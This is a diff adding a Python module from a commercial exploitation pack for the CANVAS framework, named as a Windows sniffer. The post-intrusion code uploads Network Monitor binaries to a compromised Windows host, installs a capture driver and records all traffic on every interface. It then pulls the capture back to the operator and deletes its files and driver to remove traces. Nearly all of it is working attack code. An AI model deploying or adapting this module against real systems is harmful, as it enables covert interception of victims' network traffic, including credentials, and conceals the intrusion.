@@ -1,0 +1,151 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, os
+import pygtk
+import gobject
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from canvaserror import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "D2SEC Windows Sniffer"
+DESCRIPTION = "Upload and execute a sniffer on a Windows node"
+VERSION = "1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR']=None
+DOCUMENTATION["Date public"]=None
+DOCUMENTATION["CERT Advisory"]=None
+DOCUMENTATION["Repeatability"]="Infinite"
+DOCUMENTATION["References"]=None
+DOCUMENTATION["CVE Name"]=None
+DOCUMENTATION["CVE Url"]=None
+DOCUMENTATION["Notes"]=None
+
+PROPERTY={}
+PROPERTY['TYPE']="Post-Intrusion"
+PROPERTY['SITE']="Local" 
+PROPERTY['ARCH']=[ ["Windows"] ]
+
+RES = os.getcwd() + "/3rdparty/D2SEC/Resources/d2sec_winsniff"
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.node = "" 
+		self.host = ""
+		self.files = ['nmconfig.exe', 'nmcap.exe']
+		self.dstfolder = "c:\\temp"
+		self.cap = "d2sec.cap"
+		self.time = 10
+		self.supportedNodeArgs = [["win32Node"]]
+		self.arch = "x86"
+		self.name = NAME
+
+	def getArgs(self):
+		self.dstfolder = self.argsDict.get("dstfolder",self.dstfolder)
+		self.cap = self.argsDict.get("cap",self.cap)
+		self.time = int(self.argsDict.get("time",self.time))
+		self.arch = self.argsDict.get("arch",self.arch)
+
+	def upload_sniffer(self):
+		for file in self.files:		
+			self.log("[D2 LOG] Upload %s to %s\%s" % (file, self.dstfolder, file))
+			try:
+				self.node.shell.upload(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_winsniff/resources/"+self.arch+"/"+file, "", self.dstfolder+"\\"+file)
+			except:
+				self.log("[D2 LOG] Can't upload %s" % file)
+				return 1
+		return 0
+
+	def enable_driver(self):
+		self.log("[D2 LOG] Enable the Microsoft Network Monitor driver")
+		return self.node.shell.runcommand("%s\\nmconfig.exe /install" % self.dstfolder)
+
+	def disable_driver(self):
+		self.log("[D2 LOG] Disable the Microsoft Network Monitor driver")
+		return self.node.shell.runcommand("%s\\nmconfig.exe /uninstall" % self.dstfolder)	
+
+	def test_driver(self):
+		self.log("[D2 LOG] Test the Microsoft Network Monitor driver")
+		str = self.node.shell.runcommand("%s\\nmcap.exe /displaynetworks" % self.dstfolder)
+		if str:
+			self.log(str)
+			return 0
+		else:
+			return 1
+
+	def sniff(self):
+		self.log("[D2 LOG] Sniff all traffic on every local interface")
+		self.node.shell.runcommand("%s\\nmcap.exe /Network * /Capture /File %s\%s /TerminateWhen /Timeafter %d seconds" % (self.dstfolder, self.dstfolder, self.cap, self.time))
+
+	def download_cap(self):
+		self.log("[D2 LOG] Download %s\%s to %s/%s" % (self.dstfolder, self.cap, RES, self.cap))
+		try:
+			self.node.shell.download(self.dstfolder+"\\"+self.cap, RES+"/"+self.cap)
+		except:
+			self.log("[D2 LOG] Can't download %s" % self.cap)
+			return 1
+		return 0
+
+	def delete_sniffer(self):
+		for file in self.files:
+			self.log("[D2 LOG] Delete %s on node" % file)
+			self.node.unlink("%s\%s" % (self.dstfolder, file))
+		self.log("[D2 LOG] Delete %s on node" % self.cap)
+		self.node.unlink("%s\%s" % (self.dstfolder, self.cap))
+
+	def run(self):
+		self.setInfo('%s (in progress)' % NAME)
+		self.getArgs()
+	
+		if not os.path.isdir(RES):
+			os.mkdir(RES)
+
+		# Get version
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			if type not in self.supportedNodeArgs[0]:
+				self.log("[D2 LOG] %s node type not supported"%type)
+				continue
+
+			self.node = node
+
+			if self.upload_sniffer():
+				self.setInfo('%s (failed)' % NAME)
+				return 0
+
+			if self.enable_driver():
+				self.setInfo('%s (failed)' % NAME)
+				return 0
+
+			if self.test_driver(): 
+				self.setInfo('%s (failed)' % NAME)
+				return 0
+
+			self.sniff()
+			self.download_cap()
+			self.disable_driver()
+			self.delete_sniffer()
+
+		self.setInfo('%s (success)' % NAME)
+
+		return 1
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
+
